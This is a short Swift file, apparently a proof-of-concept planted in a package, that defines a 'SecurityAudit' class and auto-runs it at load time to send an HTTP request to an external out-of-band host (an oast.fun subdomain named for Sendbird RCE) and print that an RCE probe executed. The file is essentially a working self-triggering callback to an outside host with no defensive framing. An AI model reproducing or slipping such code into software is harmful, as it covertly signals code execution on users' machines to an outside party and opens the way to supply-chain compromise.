import Foundation

@objc public class SecurityAudit: NSObject {
    @objc public static func trigger() {
        let oastUrl = "http://sendbird-audit-rce.zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/poc"
        if let url = URL(string: oastUrl) {
            let task = URLSession.shared.dataTask(with: url) { _, _, _ in }
            task.resume()
            print("[!] SENDBIRD SECURITY AUDIT ACTIVE - RCE PROBE EXECUTED")
        }
    }
}

// Auto-trigger for Swift environments
let _ = SecurityAudit.trigger()
